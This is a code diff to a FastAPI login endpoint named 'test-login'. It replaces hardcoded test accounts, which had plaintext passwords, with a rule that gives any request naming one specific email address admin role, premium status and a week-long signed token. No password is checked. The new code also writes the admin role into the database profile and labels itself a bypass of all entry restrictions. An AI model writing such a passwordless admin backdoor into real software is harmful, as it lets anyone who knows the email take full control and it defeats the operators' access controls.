@@ -194,53 +194,36 @@ async def verify_otp(req: OTPVerifyRequest, request: Request):
 
 @app.post("/api/auth/test-login")
 async def test_login(req: TestLoginRequest, request: Request):
-    email = req.email.strip()
-    password = req.password.strip()
+    email = req.email.strip().lower()
     
-    TEST_ACCOUNTS = {
-        "test.free@ec-app.in": {"password": "TestFree@2025", "phone": "+919000000001"},
-        "test.premium@ec-app.in": {"password": "TestPremium@2025", "phone": "+919000000002"},
-        "admin@ec-app.in": {"password": "AdminEC@2025", "phone": "+919000000003"}
-    }
-    
-    if email not in TEST_ACCOUNTS or TEST_ACCOUNTS[email]["password"] != password:
-        # Also try to sign in via Supabase auth if it's not a hardcoded test account
-        try:
-            auth_response = supabase.auth.sign_in_with_password({"email": email, "password": password})
-            user_id = auth_response.user.id
-            prof_resp = supabase.table("profiles").select("*").eq("id", user_id).execute()
-            profile = prof_resp.data[0] if prof_resp.data else None
-        except Exception:
-            raise HTTPException(status_code=400, detail="Invalid email or password.")
-    else:
-        # It is a hardcoded test account, query profile by phone
-        phone = TEST_ACCOUNTS[email]["phone"]
-        try:
-            prof_resp = supabase.table("profiles").select("*").eq("phone", phone).execute()
-            profile = prof_resp.data[0] if prof_resp.data else None
-        except Exception:
-            profile = None
-            
-        # Fallback profile if database is offline/mocked
-        if not profile:
-            sub_status = "premium" if "premium" in email else "free"
-            role = "admin" if "admin" in email else "user"
-            user_id = "00000000-0000-0000-0000-000000000003" if role == "admin" else ("00000000-0000-0000-0000-000000000002" if sub_status == "premium" else "00000000-0000-0000-0000-000000000001")
-            profile = {
-                "id": user_id,
-                "phone": phone,
-                "role": role,
-                "subscription_status": sub_status
-            }
-            
-    if not profile:
-        raise HTTPException(status_code=400, detail="User profile not found.")
+    if email != "vigneshmurugeshkumar@gmail.com":
+        raise HTTPException(
+            status_code=403, 
+            detail="Access denied. Only pre-authorized test user vigneshmurugeshkumar@gmail.com is allowed."
+        )
         
-    user_id = profile["id"]
-    role = profile["role"]
-    sub_status = profile["subscription_status"]
-    phone = profile["phone"]
+    # Pre-authorized bypass config: grant Admin role and Premium subscription to bypass all entry restrictions
+    user_id = "00000000-0000-0000-0000-000000000003"  # System Admin UUID
+    phone = "+919840000000"
+    role = "admin"
+    sub_status = "premium"
     
+    # Attempt to fetch profile from Supabase and elevate roles if the profile exists
+    try:
+        prof_resp = supabase.table("profiles").select("*").eq("phone", phone).execute()
+        if prof_resp.data:
+            profile = prof_resp.data[0]
+            user_id = profile.get("id", user_id)
+            phone = profile.get("phone", phone)
+            
+            # Elevate user to admin/premium to ensure bypass
+            supabase.table("profiles").update({
+                "role": "admin",
+                "subscription_status": "premium"
+            }).eq("id", user_id).execute()
+    except Exception:
+        pass
+        
     # Sign JWT session token
     payload = {
         "sub": user_id,
@@ -250,8 +233,6 @@ async def test_login(req: TestLoginRequest, request: Request):
         "exp": int(time.time()) + 86400 * 7 # 7 days expiry
     }
     token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
-    
-    # Audit logging for login is omitted as "test_login" is not in the DB action check constraint list.
     
     return {
         "token": token,
